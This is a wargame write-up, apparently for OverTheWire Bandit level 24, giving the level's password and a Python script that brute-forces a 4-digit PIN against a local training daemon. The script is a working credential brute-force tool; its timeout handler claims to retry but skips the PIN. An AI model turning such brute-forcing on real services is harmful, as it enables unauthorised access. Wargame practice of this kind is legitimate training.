# username
bandit24
# password
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
# objective
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time
# method of solve
We will write a Python script that brute forces the 4-digit PIN code:
```
#!/usr/bin/env python3
import socket
import sys

def brute_force():
    password = "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"
    
    for pincode in range(0, 10000):
        try:
            # Create NEW connection for each attempt
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2)  # 2-second timeout
                s.connect(("127.0.0.1", 30002))
                
                # Read welcome message (optional)
                welcome_msg = s.recv(2048).decode()
                print(f"Trying {pincode:04d}", end='\r', flush=True)
                
                # Send attempt
                message = f"{password} {pincode:04d}\n"
                s.sendall(message.encode())
                
                # Get response
                response = s.recv(1024).decode()
                
                if "Wrong" not in response:
                    print(f"\nSuccess! PIN: {pincode:04d}")
                    print("Response:", response)
                    return True
                    
        except socket.timeout:
            print(f"\nTimeout on PIN {pincode:04d}, retrying...")
            continue
        except Exception as e:
            print(f"\nError on PIN {pincode:04d}: {str(e)}")
            continue
    
    return False

if __name__ == "__main__":
    if brute_force():
        sys.exit(0)
    else:
        print("\nFailed to find correct PIN")
        sys.exit(1)

```
